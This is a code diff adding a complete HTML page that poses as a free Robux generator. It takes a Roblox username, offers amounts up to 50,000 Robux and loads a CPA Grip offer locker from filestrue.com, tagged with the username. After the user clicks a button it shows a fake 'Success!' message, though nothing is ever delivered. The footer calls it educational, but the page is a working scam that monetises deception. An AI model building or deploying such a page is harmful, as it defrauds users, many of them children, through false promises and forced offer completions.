@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Get Free Robux</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Poppins", sans-serif;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        .navbar {
+            width: 100%;
+            height: 90px;
+            background-color: #1a1b1d;
+            display: flex;
+            align-items: center;
+            justify-content: space-evenly;
+            color: #fff;
+        }
+        
+        .profile {
+            display: flex;
+            align-items: center;
+        }
+        
+        .profileimg {
+            width: 60px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        
+        .profileimg img {
+            width: 100%;
+            border-radius: 50%;
+        }
+        
+        .navbar button {
+            background-color: #00b06f;
+            border: none;
+            outline: none;
+            border-radius: 5px;
+            padding: 10px 40px;
+            cursor: pointer;
+            color: #fff;
+            font-size: 15px;
+        }
+        
+        .container {
+            min-height: calc(100vh - 210px);
+            width: 100%;
+            background: linear-gradient(135deg, #1a1b1d 0%, #2a2b2d 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        .box {
+            width: 100%;
+            max-width: 550px;
+            background-color: #1a1b1d;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .logo {
+            width: 200px;
+            margin: 0 auto 20px;
+        }
+        
+        .logo img {
+            width: 100%;
+        }
+        
+        .title {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .description {
+            color: #b7b1b1;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #333;
+            border-radius: 8px;
+            background: #000;
+            color: #fff;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: #00b06f;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+            transition: background 0.3s;
+        }
+        
+        button:hover {
+            background: #068657;
+        }
+        
+        .footer {
+            background-color: #1a1b1d;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #333;
+        }
+        
+        .footer p {
+            color: #b7b1b1;
+            font-size: 12px;
+            margin: 5px 0;
+        }
+        
+        .robux-option {
+            background: #2a2b2d;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .robux-option:hover {
+            background: #00b06f;
+        }
+        
+        .robux-amount {
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        /* أنماط الـ Content Locker */
+        .content-locker {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #2a2b2d;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .locker-title {
+            color: #00b06f;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+        
+        .locker-description {
+            color: #b7b1b1;
+            margin-bottom: 20px;
+        }
+        
+        .cpagrip-container {
+            margin: 20px 0;
+            min-height: 400px;
+        }
+
+        .loading-message {
+            color: #00b06f;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="profile">
+            <div class="profileimg">
+                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/1737700441f54cda29360d16d1cb0f02e0e32ee181.png" alt="Profile">
+            </div>
+            <div class="text">
+                <h4>Robux Generator</h4>
+                <p>Get Free Robux</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="box" id="step1">
+            <div class="logo">
+                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" alt="Roblox Logo">
+            </div>
+            
+            <h2 class="title">Get Free Robux</h2>
+            <p class="description">
+                Enter your Roblox username to generate free Robux
+            </p>
+            
+            <input type="text" id="username" placeholder="Enter your Roblox username...">
+            <button onclick="goToStep2()">Continue</button>
+        </div>
+        
+        <div class="box" id="step2" style="display: none;">
+            <h2 class="title">Select Robux Amount</h2>
+            <p class="description">Choose how much Robux you want to generate</p>
+            
+            <div class="robux-option" onclick="selectRobux(1700)">
+                <span>1,700 Robux</span>
+                <span class="robux-amount">FREE</span>
+            </div>
+            
+            <div class="robux-option" onclick="selectRobux(4500)">
+                <span>4,500 Robux</span>
+                <span class="robux-amount">FREE</span>
+            </div>
+            
+            <div class="robux-option" onclick="selectRobux(10000)">
+                <span>10,000 Robux</span>
+                <span class="robux-amount">FREE</span>
+            </div>
+            
+            <div class="robux-option" onclick="selectRobux(50000)">
+                <span>50,000 Robux</span>
+                <span class="robux-amount">FREE</span>
+            </div>
+        </div>
+        
+        <div class="box" id="step3" style="display: none;">
+            <div class="logo">
+                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" alt="Roblox Logo">
+            </div>
+            
+            <h2 class="title">Complete Verification</h2>
+            <p class="description">
+                Complete one quick verification to receive your <span id="selectedAmount">0</span> Robux
+            </p>
+            
+            <!-- ============================================ -->
+            <!-- 🎯 CPA Grip Content Locker - مدمج هنا -->
+            <!-- ============================================ -->
+            
+            <div class="content-locker" id="cpaGripLocker">
+                <h3 class="locker-title">Complete Offer to Unlock</h3>
+                <p class="locker-description">Choose one offer below to verify your account</p>
+                
+                <div class="cpagrip-container" id="cpagripContainer">
+                    <div class="loading-message" id="loadingMessage">Loading offers...</div>
+                    <!-- سيتم تحميل كود CPA Grip هنا ديناميكياً -->
+                </div>
+                
+                <button onclick="checkVerification()" style="margin-top: 20px;">
+                    I've Completed an Offer
+                </button>
+            </div>
+            
+            <!-- ============================================ -->
+            <!-- نهاية كود CPA Grip -->
+            <!-- ============================================ -->
+        </div>
+        
+        <div class="box" id="step4" style="display: none;">
+            <div class="logo">
+                <img src="https://d39fkvblvwpxa1.cloudfront.net/uploads/16649140404249d616d649baaf9da11aa8f051c07c.png" alt="Roblox Logo">
+            </div>
+            
+            <h2 class="title">Success!</h2>
+            <p class="description">
+                Your <span id="finalAmount">0</span> Robux are being sent to your account: 
+                <strong id="finalUsername">username</strong>
+            </p>
+            <p class="description">
+                Please allow 5-10 minutes for the Robux to appear in your account.
+            </p>
+            
+            <button onclick="restartProcess()">Generate More Robux</button>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>This is not an official Roblox website. We are not affiliated with Roblox Corp.</p>
+        <p>© 2024 Robux Generator - For educational purposes only</p>
+    </div>
+
+    <script>
+        let selectedRobuxAmount = 0;
+        let username = '';
+        let cpaGripLoaded = false; // متتبع لمعرفة إذا كان CPA Grip قد تم تحميله
+        
+        function goToStep2() {
+            username = document.getElementById('username').value.trim();
+            if (username.length < 3) {
+                alert('Please enter a valid Roblox username');
+                return;
+            }
+            
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+        
+        function selectRobux(amount) {
+            selectedRobuxAmount = amount;
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+            document.getElementById('selectedAmount').textContent = amount.toLocaleString();
+            document.getElementById('cpaGripLocker').style.display = 'block';
+            
+            // تحميل CPA Grip فقط إذا لم يكن محملاً مسبقاً
+            if (!cpaGripLoaded) {
+                loadCPAGrip();
+            }
+        }
+        
+        function loadCPAGrip() {
+            const container = document.getElementById('cpagripContainer');
+            const loadingMessage = document.getElementById('loadingMessage');
+            
+            // إنشاء العناصر البرمجية لـ CPA Grip
+            const script1 = document.createElement('script');
+            script1.type = 'text/javascript';
+            script1.textContent = 'var lck = false;';
+            
+            const script2 = document.createElement('script');
+            script2.type = 'text/javascript';
+            // إضافة معلمات التتبع إلى الرابط
+            script2.src = `https://filestrue.com/script_include.php?id=1853706&tracking_id=${encodeURIComponent(username)}_${selectedRobuxAmount}`;
+            
+            const script3 = document.createElement('script');
+            script3.type = 'text/javascript';
+            script3.textContent = 'if(!lck){top.location = "https://filestrue.com/help/ablk.php?lkt=1"; }';
+            
+            const noscript = document.createElement('noscript');
+            noscript.innerHTML = 'Please enable JavaScript to access this page.<meta http-equiv="refresh" content="0;url=https://filestrue.com/help/enable_javascript.php?lkt=1" />';
+            
+            // مسح رسالة التحميل وإضافة السكريبتات
+            container.innerHTML = '';
+            container.appendChild(script1);
+            container.appendChild(script2);
+            container.appendChild(script3);
+            container.appendChild(noscript);
+            
+            cpaGripLoaded = true;
+            
+            // تعيين حدث لمعرفة عندما يتم تحميل السكريبت الثاني
+            script2.onload = function() {
+                console.log('CPA Grip script loaded successfully');
+            };
+            
+            script2.onerror = function() {
+                loadingMessage.textContent = 'Error loading offers. Please try again.';
+            };
+        }
+        
+        function checkVerification() {
+            // هذه الدالة للتحقق من إكمال العرض
+            // CPA Grip عادة ما يوفر طريقة للتحقق تلقائياً
+            // ولكن يمكن استخدام هذا الزر كبديل أو لتأكيد الإكمال
+            
+            alert('Verifying your completion... Please wait while we confirm your offer.');
+            
+            // في الواقع الفعلي، CPA Grip سيتحقق تلقائياً
+            // ولكن لأغراض العرض، سننتقل للخطوة التالية
+            setTimeout(() => {
+                document.getElementById('step3').style.display = 'none';
+                document.getElementById('step4').style.display = 'block';
+                document.getElementById('finalAmount').textContent = selectedRobuxAmount.toLocaleString();
+                document.getElementById('finalUsername').textContent = username;
+            }, 2000);
+        }
+        
+        function restartProcess() {
+            document.getElementById('step4').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('username').value = '';
+            selectedRobuxAmount = 0;
+            username = '';
+            
+            // إعادة تعيين حالة CPA Grip لإمكانية إعادة التحميل
+            cpaGripLoaded = false;
+            document.getElementById('cpagripContainer').innerHTML = '<div class="loading-message" id="loadingMessage">Loading offers...</div>';
+        }
+        
+        // دالة للمساعدة في تتبع التحويلات
+        function trackConversion() {
+            // هنا يمكنك إضافة كود تتبع التحويلات
+            console.log('Conversion tracked for:', username, 'Amount:', selectedRobuxAmount);
+        }
+    </script>
+</body>
+</html>
